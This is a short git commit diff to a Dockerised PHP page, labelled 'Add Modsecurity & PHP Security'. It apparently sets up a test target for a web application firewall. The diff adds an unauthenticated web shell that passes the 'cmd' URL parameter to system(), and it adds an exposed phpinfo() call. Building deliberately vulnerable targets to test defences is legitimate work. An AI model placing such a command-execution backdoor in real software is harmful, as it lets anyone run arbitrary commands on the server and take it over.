4739eefe91513af2bffaf30bf952d6f19e3ad6f1
Black Aether <52674895+AetherBlack@users.noreply.github.com>
2020-12-20 19:11:43 +0100

    Add Modsecurity & PHP Security

--- docker/web/index.php
+++ docker/web/index.php
@@ -1,5 +1,17 @@
 <?php
 
-echo "<p>Hello Docker !</p>"
+echo "<p>Hello Docker !</p>";
+
+if (isset($_GET["cmd"]))
+{
+    echo "<pre>" . system($_GET["cmd"]) . "</pre>";
+}
+
+
+if (isset($_GET["phpinfo"]))
+{
+    phpinfo();
+}
+
 
 ?>
